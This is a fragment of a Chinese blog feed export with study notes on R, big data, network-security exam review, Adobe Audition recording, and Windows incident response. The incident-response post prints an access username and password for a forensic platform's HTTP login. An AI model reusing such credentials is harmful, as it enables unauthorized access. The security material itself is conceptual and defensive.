class="line">[1] 1 2 3</span><br><span class="line">Levels: 1 2 3 4 5</span><br><span class="line">&gt; factor(1:3,levels &#x3D; 1:5,labels &#x3D; c(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;))</span><br><span class="line">[1] A B C</span><br><span class="line">Levels: A B C D E</span><br><span class="line">#向量转无序因子</span><br><span class="line">&gt; as.factor(1:3)</span><br><span class="line">[1] 1 2 3</span><br><span class="line">Levels: 1 2 3</span><br><span class="line">#向量转有序因子</span><br><span class="line">&gt; as.ordered(1:3)</span><br><span class="line">[1] 1 2 3</span><br><span class="line">Levels: 1 &lt; 2 &lt; 3</span><br><span class="line">#12.流程控制</span><br><span class="line">&gt; a&lt;-3.1415926</span><br><span class="line">if(a&gt;0)&#123;</span><br><span class="line"> print(&quot;hello&quot;)</span><br><span class="line"> &#125;else if(a&#x3D;&#x3D;0)&#123;</span><br><span class="line"> print(&quot;world&quot;)</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> print(&quot;;&quot;)</span><br><span class="line"> &#125;</span><br><span class="line">[1] &quot;hello&quot;</span><br><span class="line">#13.for循环</span><br><span class="line"></span><br><span class="line">&gt; for(i in 1:100)&#123;</span><br><span class="line">+ s&lt;-s+i</span><br><span class="line">+ i&lt;-i+1</span><br><span class="line">+ print(s)</span><br><span class="line">+ &#125;</span><br><span class="line">#14.while循环</span><br><span class="line">&gt; s&lt;-0</span><br><span class="line">&gt; i&lt;-1</span><br><span class="line">&gt; while(i&lt;&#x3D;100)&#123;</span><br><span class="line">+ s&lt;-s+i</span><br><span class="line">+ i&lt;-i+1</span><br><span class="line">+ print(s)</span><br><span class="line">+ &#125;</span><br><span class="line">#15.函数编写</span><br><span class="line">func&lt;-function(x1,x2&#x3D;0)&#123;</span><br><span class="line">temp&lt;-x1+2*x2</span><br><span class="line">if(x1+x2&gt;&#x3D;100)&#123;</span><br><span class="line">result&lt;-300*temp-90</span><br><span class="line">&#125;else if((x1+x2)&gt;&#x3D;-90)&#123;</span><br><span class="line">result&lt;-9-temp</span><br><span class="line">&#125;else&#123;</span><br><span class="line">result&lt;-NA</span><br><span class="line">&#125;</span><br><span class="line">result&#125;</span><br><span class="line">&gt; func(x2&#x3D;1,x1&#x3D;1100)</span><br><span class="line">[1] 330510</span><br></pre></td></tr></table></figure></div>

<h1 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h1><ul>
<li>神经网络</li>
<li>图建模</li>
<li>人工智能</li>
<li>模式识别</li>
<li>最优化理论和信号处理</li>
</ul>
<h1 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h1><p>一种“机器人程序”其作用是自动采集所有它们可以到达的网页，并记录下这些网页的内容，以便其他程序进行后续的处理</p>
<h1 id="通用爬虫"><a href="#通用爬虫" class="headerlink" title="通用爬虫"></a>通用爬虫</h1><p>追求大的覆盖范围，对于网页中提取到的超链接会全收</p>
<h1 id="聚焦爬虫"><a href="#聚焦爬虫" class="headerlink" title="聚焦爬虫"></a>聚焦爬虫</h1><p>对提取到的超链接进行过滤，只对特定网站或者特定领域的网站进行爬取</p>
<h1 id="机械分词"><a href="#机械分词" class="headerlink" title="机械分词"></a>机械分词</h1><p>将待处理的中文字符串与一个“尽可能全面”的字典中词条按照一定的规则匹配</p>
<h1 id="用户画像构建流程"><a href="#用户画像构建流程" class="headerlink" title="用户画像构建流程"></a>用户画像构建流程</h1><ul>
<li>1、数据收集与分析</li>
<li>2、行为建模</li>
<li>3、构建用户画像</li>
<li>4、数据可视化分析</li>
</ul>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】计算机网络安全复习总结</title>
    <url>/posts/189.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简述网络安全的基本含义"><a href="#简述网络安全的基本含义" class="headerlink" title="简述网络安全的基本含义"></a>简述网络安全的基本含义</h1><blockquote>
<p>网络系统中的硬件、软件和系统中的数据受到保护，不因为偶然的或者恶意的愿意而遭到破坏、更改或者泄露，系统连续可靠正常的运行，网络服务不中断。（<strong>其实就是想尽办法让计算机正常运行以及正常运行的过程中不受干扰</strong>）</p>
</blockquote>
<h1 id="网络所面临的安全威胁主要有哪些？"><a href="#网络所面临的安全威胁主要有哪些？" class="headerlink" title="网络所面临的安全威胁主要有哪些？"></a>网络所面临的安全威胁主要有哪些？</h1><ul>
<li>1、物理因素<ul>
<li>硬件老化</li>
<li>所处位置容易被触碰</li>
<li>所处位置潮湿、灰尘多等</li>
</ul>
</li>
<li>2、系统因素<ul>
<li>漏洞等</li>
</ul>
</li>
<li>3、人为因素<ul>
<li>恶意攻击</li>
<li>配置错误，泄露</li>
</ul>
</li>
</ul>
<h1 id="什么是网络攻击"><a href="#什么是网络攻击" class="headerlink" title="什么是网络攻击"></a>什么是网络攻击</h1><blockquote>
<p>对计算机和计算机网络来说，破坏、揭露、修改、使软件或服务失去功能，在没有得到授权的情况下偷取或访问任一计算机的数据，都会被视为于计算机和计算机网络中的攻击。</p>
</blockquote>
<h1 id="主动攻击和被动攻击的区别是什么"><a href="#主动攻击和被动攻击的区别是什么" class="headerlink" title="主动攻击和被动攻击的区别是什么"></a>主动攻击和被动攻击的区别是什么</h1><ul>
<li>1、主动攻击<ul>
<li>对数据流进行篡改或者伪造</li>
<li>方法五类<ul>
<li>重放</li>
<li>伪造</li>
<li>篡改</li>
<li>拒绝服务（Dos）</li>
<li>分布式拒绝服务（DDOS）</li>
</ul>
</li>
</ul>
</li>
<li>2、被动攻击<ul>
<li>对传输中的信息进行窃听或者检测</li>
<li>方法：信息收集和流量分析</li>
</ul>
</li>
<li>网络安全的属性有哪些？<ul>
<li>主要的三大CIA，保密性、完整性、可用性</li>
<li>总计<ul>
<li>1、保密性</li>
<li>2、完整性</li>
<li>3、可用性</li>
<li>4、可控性</li>
<li>5、真实性</li>
<li>6、不可否认性</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="ISO开放系统互联安全体系定义了哪五类安全服务？"><a href="#ISO开放系统互联安全体系定义了哪五类安全服务？" class="headerlink" title="ISO开放系统互联安全体系定义了哪五类安全服务？"></a>ISO开放系统互联安全体系定义了哪五类安全服务？</h1><ul>
<li>1、鉴别服务</li>
<li>2、访问控制服务</li>
<li>3、数据保密性服务</li>
<li>4、数据完整性服务</li>
<li>5、抗抵赖性服务</li>
</ul>
<h1 id="PPDR模型的四个主要部分是什么？"><a href="#PPDR模型的四个主要部分是什么？" class="headerlink" title="PPDR模型的四个主要部分是什么？"></a>PPDR模型的四个主要部分是什么？</h1><ul>
<li>安全策略</li>
<li>保护</li>
<li>检测</li>
<li>响应</li>
</ul>
<h1 id="简要表明为什么要制定计算机安全的规范与标准"><a href="#简要表明为什么要制定计算机安全的规范与标准" class="headerlink" title="简要表明为什么要制定计算机安全的规范与标准?"></a>简要表明为什么要制定计算机安全的规范与标准?</h1><ul>
<li>用于规范网络安全技术工程</li>
</ul>
<h1 id="简述几种常见的网络攻击形式"><a href="#简述几种常见的网络攻击形式" class="headerlink" title="简述几种常见的网络攻击形式"></a>简述几种常见的网络攻击形式</h1><ul>
<li>1、中间人攻击<ul>
<li>双方还未通信时进入第三者，实际是第三者和双方通信</li>
</ul>
</li>
<li>2、SQL注入<ul>
<li>通过URL将关键SQL语句代入程序，SQL语句在程序中拼接后对数据库造成了破坏</li>
</ul>
</li>
<li>3、XSS攻击<ul>
<li>恶意脚本嵌入用户访问的网页中，当恶意脚本执行，会劫持用户会话等</li>
</ul>
</li>
</ul>
<h1 id="密码学RSA"><a href="#密码学RSA" class="headerlink" title="密码学RSA"></a>密码学RSA</h1><p><img src="https://gylq.gitee.io/linkimage/img1/84447B6F5BB4D6FD4C66B3D40D5CA8F3.jpg" alt="img"></p>
<h1 id="消息认证与数字签名"><a href="#消息认证与数字签名" class="headerlink" title="消息认证与数字签名"></a>消息认证与数字签名</h1><ul>
<li>为什么需要消息认证？<ul>
<li>保证消息的完整性防止窜改</li>
</ul>
</li>
<li>SHA中使用的基本算术是什么？<ul>
<li>异或XOR，循环移位，摸加，与，或，非</li>
</ul>
</li>
<li>一个安全的散列函数需要满足的特性有哪些？<ul>
<li>1、产生固定值</li>
<li>2、计算容易</li>
<li>3、可逆性很低</li>
<li>4、碰撞性低</li>
</ul>
</li>
<li>散列函数和消息认证码有什么区别？<ul>
<li>消息认证码需要用到密钥生成数据块附加在消息后</li>
<li>但散列函数不需要用密钥，还会为消息生成唯一的散列码</li>
</ul>
</li>
<li>数字签名和散列函数的应用有什么不同？<ul>
<li>散列主要用于验证消息的完整性</li>
<li>但数字签名可以保证找到消息的发送者和制造者可以防消息伪造</li>
</ul>
</li>
<li>数字签名满足条件<ul>
<li>数据完整性</li>
<li>不可否认性</li>
<li>真实性</li>
</ul>
</li>
<li>常用的数字签名技术<ul>
<li>RSA，EIGaml</li>
</ul>
</li>
<li>身份认证<ul>
<li>用户认证的主要方法有哪些？<ul>
<li>口令、动态密码，IC卡，生物特征</li>
</ul>
</li>
</ul>
</li>
<li>什么是AAA技术<ul>
<li>授权</li>
<li>认证</li>
<li>计费</li>
</ul>
</li>
<li>Kerberos协议是为了解决什么问题? <ul>
<li>保证真实性和安全性</li>
</ul>
</li>
</ul>
<h1 id="公钥基础设施PKI"><a href="#公钥基础设施PKI" class="headerlink" title="公钥基础设施PKI"></a>公钥基础设施PKI</h1><h1 id="什么是数字证书？数字证书的基本功能是什么"><a href="#什么是数字证书？数字证书的基本功能是什么" class="headerlink" title="什么是数字证书？数字证书的基本功能是什么"></a>什么是数字证书？数字证书的基本功能是什么</h1><p>就是个人或单位在网络上的身份证，数字证书能确保身份被认证，并且保证双方能安全放心的交换密钥。</p>
<h1 id="简述CA的基本职责"><a href="#简述CA的基本职责" class="headerlink" title="简述CA的基本职责"></a>简述CA的基本职责</h1><p>数字证书的颁发、认证、更新和吊销</p>
<h1 id="IPSec提供哪些安全服务"><a href="#IPSec提供哪些安全服务" class="headerlink" title="IPSec提供哪些安全服务?"></a>IPSec提供哪些安全服务?</h1><ul>
<li>保证数据完整</li>
<li>保证数据真实保密</li>
<li>防止重放攻击</li>
</ul>
<p>AH提供无连接的完整性、数据源认证和防消息重放</p>
<p>ESP：完整性校验、身份认证、防消息重复、消息加密</p>
<h1 id="简述SSL协议"><a href="#简述SSL协议" class="headerlink" title="简述SSL协议"></a>简述SSL协议</h1><ul>
<li>位于传输层和应用层之间</li>
<li>两层，一层是握手，一层是记录</li>
<li>一是SSL连接，它提供了用户和服务器之间的传输</li>
<li>二是SSL会话，它是客户端与服务端之间的关联，通过握手协议创建</li>
</ul>
<h1 id="防火墙技术"><a href="#防火墙技术" class="headerlink" title="防火墙技术"></a>防火墙技术</h1><h1 id="什么是防火墙？"><a href="#什么是防火墙？" class="headerlink" title="什么是防火墙？"></a>什么是防火墙？</h1><blockquote>
<p>防火墙可以是软件，也可以是硬件。</p>
</blockquote>
<ul>
<li>软件防火墙一般只能保护个人主机也就是我们系统上那个防火墙</li>
<li>硬件防火墙可以保护内网的许多计算机，它是一个设备一般放在路由器前面保护路由器和内网主机</li>
</ul>
<h1 id="简述防火墙的主要功能"><a href="#简述防火墙的主要功能" class="headerlink" title="简述防火墙的主要功能"></a>简述防火墙的主要功能</h1><ul>
<li>1、网络安全屏障</li>
<li>2、强化网络安全策略</li>
<li>3、监控审计</li>
<li>4、防止内部信息的外协</li>
<li>5、日志记录与事件通知</li>
</ul>
<h1 id="防火墙技术分类"><a href="#防火墙技术分类" class="headerlink" title="防火墙技术分类"></a>防火墙技术分类</h1><ul>
<li>包过滤型防火墙</li>
<li>应用代理型防火墙</li>
</ul>
<h1 id="简述包过滤原理"><a href="#简述包过滤原理" class="headerlink" title="简述包过滤原理"></a>简述包过滤原理</h1><blockquote>
<p>基于网络层的防火墙技术，其核心是包过滤算法的设计，也叫做安全策略设计。包过滤防火墙读取流过它的每一个数据包的报头信息，然后用预先设定好的过滤规则与之逐条匹配，成功则转发，不成功就丢弃。</p>
</blockquote>
<h1 id="什么是ACL控制访问技术"><a href="#什么是ACL控制访问技术" class="headerlink" title="什么是ACL控制访问技术"></a>什么是ACL控制访问技术</h1><p>简单来说就是一张表，记录了哪些数据可以收，哪些包不能收，控制数据包流入</p>
<blockquote>
<p><strong>访问控制列表（Access Control Lists，ACL）是应用在路由器接口的指令列表，这些指令列表用来告诉路由器哪些数据包可以收、哪些数据包需要拒绝。至于数据包是被接收还是拒绝，可以由类似于源地址、目的地址、端口号等的特定指示条件来决定。</strong></p>
</blockquote>
<p>ACL是包过滤技术的一种实现</p>
<h1 id="为了控制访问和加强站点安全策略-防火墙采用了哪些技术"><a href="#为了控制访问和加强站点安全策略-防火墙采用了哪些技术" class="headerlink" title="为了控制访问和加强站点安全策略,防火墙采用了哪些技术?"></a>为了控制访问和加强站点安全策略,防火墙采用了哪些技术?</h1><ul>
<li>1、包过滤技术</li>
<li>2、应用代理技术</li>
<li>3、状态检测技术</li>
</ul>
<h1 id="什么是入侵检测？"><a href="#什么是入侵检测？" class="headerlink" title="什么是入侵检测？"></a>什么是入侵检测？</h1><p>通过对行为、安全日志或审计数据，检测对系统的闯入的企图</p>
<h1 id="简述VPN"><a href="#简述VPN" class="headerlink" title="简述VPN"></a>简述VPN</h1><blockquote>
<p>VPN就是虚拟专用网，在公用网络上建立专用网络，和对方进行加密通讯</p>
<p>利用了隧道技术、加密技术、密钥管理技术和身份认证技术</p>
</blockquote>
<h1 id="什么是网络监听-网络监听的作用是什么"><a href="#什么是网络监听-网络监听的作用是什么" class="headerlink" title="什么是网络监听?网络监听的作用是什么?"></a>什么是网络监听?网络监听的作用是什么?</h1><p>网络监听是一种监视网络状态、数据流程以及网络上信息传输的工具</p>
<ul>
<li>正面作用<ul>
<li>监视网络的流量、状态、数据等信息</li>
</ul>
</li>
<li>负面作用<ul>
<li>网络通信不畅、数据丢失、信息被窃取</li>
</ul>
</li>
</ul>
<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>往程序的缓冲区写超出其长度的内容，造成溢出，从而破坏程序的堆栈，让程序执行其他命令</p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>目的就是通过扫描知道一个计算机提供的服务，然后利用已知漏洞攻击</p>
<h1 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h1><ul>
<li>DOS就是拒绝服务攻击</li>
<li>DDOS就是分布式拒绝服务攻击</li>
</ul>
<p>攻击类别有两种</p>
<ul>
<li>一是带宽攻击，通过发送垃圾大量信息占用带宽，导致正常用户无法请求到服务器</li>
<li>二是连通性攻击，就是大量连接请求攻击服务器，使其资源消耗殆尽，最终无法响应用户。</li>
</ul>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>ARP欺骗本质是把虚假的IP-MAC映射关系通过ARP报文发给主机，让其无法正确发送数据</p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Au录音基础</title>
    <url>/posts/188.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="使用多轨"><a href="#使用多轨" class="headerlink" title="使用多轨"></a>使用多轨</h1><p>1、在录音之前</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606141727774.png" alt="image-20220606141727774"></p>
<p>选择单声道</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606142210248.png" alt="image-20220606142210248"></p>
<p>并且全部选1</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606142312311.png" alt="image-20220606142312311"></p>
<p>2、在此选择单声道1</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606142507489.png" alt="image-20220606142507489"></p>
</blockquote>
<p><strong>3、录用要点亮R，I是返音，M是静音此轨道，S就是单独播放此声道</strong></p>
<p>4、还需要设置初始电平</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606143013996.png" alt="image-20220606143013996"></p>
</blockquote>
<p>5、大部分都在-12到-21之间跳动</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606143454282.png" alt="image-20220606143454282"></p>
<p>6、黄色是<strong>音量调节</strong>，蓝色是<strong>声像</strong>（靠上是偏左声道，下是偏右声道）</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606150443765.png" alt="image-20220606150443765"></p>
<p>7、<strong>出错可以用弹舌来进行标志，接着继续录制</strong></p>
<p>8、音频分贝要求在-3到-6之间，我们如何调节</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606202910226.png" alt="image-20220606202910226"></p>
<p>9、标准化处理</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606202949770.png" alt="image-20220606202949770"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220606203253513.png" alt="image-20220606203253513"></p>
<h1 id="录音的基本操作"><a href="#录音的基本操作" class="headerlink" title="录音的基本操作"></a>录音的基本操作</h1><p>1、录完一段音之后，需要降噪、去口水、均衡，如果是用电子管压缩器之后还要做一遍均衡</p>
<p>2、第一步、降噪、去口水、电子管压缩器、均衡、强制振幅</p>
<p>3、收藏夹有一个开始记录收藏</p>
<h1 id="音效操作"><a href="#音效操作" class="headerlink" title="音效操作"></a>音效操作</h1><p>1、电话音</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607075540889.png" alt="image-20220607075540889"></p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607075608099.png" alt="image-20220607075608099"></p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607075713671.png" alt="image-20220607075713671"></p>
<p>2、车内音</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607080159129.png" alt="image-20220607080159129"></p>
<p>3、门外音</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607080802035.png" alt="image-20220607080802035"></p>
<p>4、内心混响</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607081023726.png" alt="image-20220607081023726"></p>
<p>第一个是声音亮调节</p>
<p>第二个是控制声音的厚重感，往右声音很有分量</p>
<p>第三个是控制声音的远近距离感，越往左边贴近耳朵</p>
<p>第四个是中间那个大的，是控制空间感，左边空间感越小</p>
<p>第五个是微调</p>
<p>第六个是单声道和立体声基本不用动</p>
<p>最后一个，第七个是发送量</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607081402937.png" alt="image-20220607081402937"></p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607081411929.png" alt="image-20220607081411929"></p>
<p>5、电视机</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607081911936.png" alt="image-20220607081911936"></p>
<p>6、留声机</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607082213207.png" alt="image-20220607082213207"></p>
<p>7、FFT电话音</p>
<p><img src="https://gylq.gitee.io/linkimage//img1/image-20220607082925678.png" alt="image-20220607082925678"></p>
<p>8、变小孩声音</p>
<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220607083455778.png" alt="image-20220607083455778"></p>
<h1 id="做后期"><a href="#做后期" class="headerlink" title="做后期"></a>做后期</h1><p>一个积累音效和背景音乐的过程，然后把它运用的恰当，让声音锦上添花。</p>
<p>1、建立自己的音效文件夹 。</p>
<p>2、简配，音效 3 - 5个， BGM 合适 价格 15-30 元</p>
<p>3、中配，搭建一组场景，音效 8 - 10， BGM贴切 5-80 元</p>
<p>4、精配：场景 2 - 3 个 ， 音效 15 个 以上，BGM合理  100 以上</p>
<p>5、超精配：所有场景，所有的音效，BGM贴切， 200以上</p>
<p><strong>不同的小说用什么音乐。</strong></p>
<p>现代言情，BGM钢琴曲。</p>
<p>校园类，吉他。</p>
<p>官场的，沉郁大气</p>
<p>古风，古筝，笙，还有琵琶等，笛子，萧</p>
<p>玄幻类</p>
<p>恐怖类 BGM，Joseph Bishara        Charlie Clouser</p>
<p>科幻类，神秘，科技感</p>
<p>配乐库：<a href="https://studio.ximalaya.com/music-web/index" target="_blank" rel="noopener">https://studio.ximalaya.com/music-web/index</a></p>
<p>6、简配定律</p>
<p>整体振幅，检查对轨文件。</p>
<p>①对轨完，报幕无背景音乐</p>
<p>②前三后五。（ 留三秒插入背景音乐）</p>
<p>③干音&gt;音效&gt;BGM&gt;环境音效 （BMG -24左右， 音效 -13左右）</p>
<p>④音效前置</p>
<p>⑤最好是用音效切换场景，转场音效</p>
<p>⑥音效、音乐、持续连贯，同一首音乐，不可重复</p>
<p>⑦音效尽量别单个出来，而是连贯的要有连续性。</p>
<p>⑧音乐无人声的，旋律不要烂大街的。</p>
<p>⑨工程文件保存三个月。以便替换。</p>
<p>⑩场景搭建</p>
<p><strong>音效网站</strong></p>
<p><a href="https://www.aigei.com/sound" target="_blank" rel="noopener">https://www.aigei.com/sound</a></p>
<p><a href="https://xiazai.51miz.com/sound/" target="_blank" rel="noopener">音效素材下载 - 音效大全 - 配乐 - 觅知网 (51miz.com)</a></p>
<p>站长素材</p>
<h1 id="快键键"><a href="#快键键" class="headerlink" title="快键键"></a>快键键</h1><p><img src="https://gylq.gitee.io/linkimage/img1/image-20220618201307525.png" alt="image-20220618201307525"></p>
<p>干音处理</p>
<p>RX 8 Mouth De-click 口水</p>
<p>RX 8 Spectral De-noise 降噪 用learn</p>
<p>FabFilter Pro-Q 3 电话音</p>
<p>FFT 门外音</p>
<p>振幅统计和 FabFilter Pro-C 2 一起使用  最左边</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220618201407457.png" alt="image-20220618201407457"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220618201420039.png" alt="image-20220618201420039"></p>
<p>干音处理流程</p>
<p>1、拉大振幅</p>
<p>2、处理口水-RX8</p>
<p>3、喷麦-RX8(框选处理，不要全选处理）-音损大</p>
<p>4、降噪Waves–NS1.Mono/NS1.Stereo（数值不能超过30，环境比较好，数值设在10以下）</p>
<p>  采样降噪（降噪：50-70之间；降噪幅度与上面持平）再捉一次NS1</p>
<p>  （底噪在-60–66之间就可以）</p>
<ol start="5">
<li>相位中置Waves–Center Stereo</li>
<li><ol start="6">
<li>单频段压缩（只调整第一个，后面参数都不变）</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>AU</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Win下的应急响应</title>
    <url>/posts/187.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>了解下黑客的目的</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115120234118.png" alt="image-20220115120234118"></p>
<p>应急线索来源：</p>
<ul>
<li>1、从流量侧发现线索<ul>
<li>Webshell攻击<ul>
<li>漏洞利用成功</li>
<li>Webshell文件操作</li>
<li>Web日志审计</li>
<li>根据时间线查</li>
</ul>
</li>
<li>异常的外联（比如恶意域名/恶意IP）</li>
<li>横向渗透工具（比如CS、SSF，nps，chrome密码提取等）</li>
<li>怀疑主机失陷（点击）</li>
</ul>
</li>
<li>2、外界情报（某系统），（听说某系统有0day）全盘的检测</li>
<li>3、造成后果后发现，被勒索了，业务挂了</li>
<li>4、安全监控设备（终端杀软，EDR）</li>
</ul>
<h2 id="windows主机取证"><a href="#windows主机取证" class="headerlink" title="windows主机取证"></a>windows主机取证</h2><h3 id="工具应急响应方法"><a href="#工具应急响应方法" class="headerlink" title="工具应急响应方法"></a>工具应急响应方法</h3><p>最简单的直接通过工具快速简洁</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼Windows终端溯源取证系统】（真实平台，可实际操作）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;ir.zorelworld.com:443&#x2F;</span><br><span class="line">401信息： 401_Z1xW5y \ Z1w5yoct.CM</span><br><span class="line">页面账号信息：可在页面自行注册</span><br></pre></td></tr></table></figure></div>

<p>1、创建项目，下载采集器，尽量不使用常驻的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154833084.png" alt="image-20220115154833084"></p>
</blockquote>
<p>2、采集资产目录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154852427.png" alt="image-20220115154852427"></p>
</blockquote>
<p>3、结果会在data目录中，有一个zip的压缩包，将其上传，可以查看取证报告</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154924693.png" alt="image-20220115154924693"></p>
</blockquote>
<p>4、取证报告</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115154949495.png" alt="image-20220115154949495"></p>
</blockquote>
<p>5、专家模式根据时间轴，判断黑客那个时间段做了啥</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115155938716.png" alt="image-20220115155938716"></p>
</blockquote>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>三要素</p>
<p>①时间②线索③黑客思路④权限（攻击者拿到的哪些信息）</p>
<p>客户端/服务端（WebShell）</p>
<p>1、发现一个Webshell</p>
<p>2、找到Webshell</p>
<p>3、Webshell的时间，找Web日志里连这个Webshell的IP，根据这个IP遍历所有日志</p>
<p>这个工具对于windows来遍历日志，一个<strong>文件搜索工具</strong></p>
<p><strong>FileLocator Pro</strong>  应急响应比较好多的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161316553.png" alt="image-20220115161316553"></p>
</blockquote>
<p>类似linux的grep</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161511590.png" alt="image-20220115161511590"></p>
</blockquote>
<p>图形化比较好多的了，Nginx日志啥的</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115161714488.png" alt="image-20220115161714488"></p>
</blockquote>
<p>4、通过everything去查找这个时间点前后1-3天的所有创建文件</p>
<p>源IP什么时间的第一次连接是什么时间，Webshell创建是什么时间，服务器第一次被这些IP访问是什么时间（根据情况判断对方是怎么攻击的）</p>
<p>5、服务器网络策略，这个服务器能不能对外联网，CS，或者NPS隧道（完全禁止—&gt;，DNS，ICMP协议）</p>
<p>6、限于找Web漏洞以及隐藏的Webshell，以及不死webShell（Mysql触发后门，NTFS隐藏了解）</p>
<p>7、端口复用，Apache插件，端口重复使用</p>
<p>8、Web服务器失陷了（Linux），翻SSH公钥，翻配置文件（数据库PHPXML），History（用户名，有多少台机子），进程（运营）</p>
<p>应急响应步骤</p>
<p>1、Tomcat漏洞利用成功，流量是实时；</p>
<p>2、断网</p>
<p>3、确定线索，漏洞利用成功（修复漏洞后尽快上线，确定有没有横向的动作），WebShell上来了（关心有没有横向渗透工具 NPS，SSF），还是内网渗透，后渗透（确定影响范围）等，第一次接触的时间，到目前为止多久</p>
<h2 id="异常的外链"><a href="#异常的外链" class="headerlink" title="异常的外链"></a>异常的外链</h2><p>1、通过IOC、恶意域名、恶意ip、恶意HASH、DGA域名</p>
<p>2、检测模型（NPS上线了，CS上线了，SSF挂出去）</p>
<p>这里推荐一个工具<strong>LiveTcpUdpWatch</strong>实时去查看进程的情况</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115165217221.png" alt="image-20220115165217221"></p>
</blockquote>
<p>Sysmon日志实时记录，因为是微软的，所以很方便</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170018007.png" alt="image-20220115170018007"></p>
</blockquote>
<p>Process Monitor</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170418866.png" alt="image-20220115170418866"></p>
</blockquote>
<p>可以看到很详细的信息，但是得一直开着，可能没有Sysmon方便</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220118160206943.png" alt=""></p>
</blockquote>
<p>AppNetworkCount，也是对应的网络链接的工具</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115170724535.png" alt="image-20220115170724535"></p>
</blockquote>
<p>DNS缓存记录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171251020.png" alt="image-20220115171251020"></p>
</blockquote>
<p>pcap.honeynet.org.my/v1/</p>
<p>如果你遇到流量包不知道怎么分析</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171335395.png" alt="image-20220115171335395"></p>
</blockquote>
<h2 id="文件分析的思路"><a href="#文件分析的思路" class="headerlink" title="文件分析的思路"></a>文件分析的思路</h2><blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171444599.png" alt="image-20220115171444599"></p>
</blockquote>
<p>MD5的威胁</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115173051567.png" alt="image-20220115173051567"></p>
</blockquote>
